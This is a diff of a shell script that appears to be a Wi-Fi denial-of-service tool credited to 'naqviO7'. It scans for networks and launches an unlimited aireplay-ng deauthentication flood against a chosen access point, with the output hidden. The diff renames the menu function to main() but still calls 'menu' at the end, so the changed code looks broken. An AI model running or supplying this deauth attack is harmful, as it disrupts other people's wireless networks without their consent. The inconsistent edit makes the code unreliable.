@@ -25,11 +25,8 @@ __      _(_)/ _(_) |_ ___ _ __
 \ \ /\ / / | |_| | __/ _ \ '__|
  \ V  V /| |  _| | ||  __/ |   
   \_/\_/ |_|_| |_|\__\___|_|   
-                               " && sleep 2
-echo "                                  Version 2.0"
-echo "                                      by naqviO7"
-
-sleep 3
+                        Version 2.0
+			   by naqviO7 " && sleep 2
 
 
 #emoji/symbol of wireless tower/wifi
@@ -52,7 +49,7 @@ echo $RESET
 nmcli dev wifi
 
 #mainmenu of DOS
-menu(){
+main(){
 	
 	echo  $orange
 	
@@ -92,5 +89,7 @@ dos(){
 	aireplay-ng --deauth 0 -a $bssid wlan0mon > /dev/null
 }
 
+#calling main function
 menu
+
 #END OF CODE
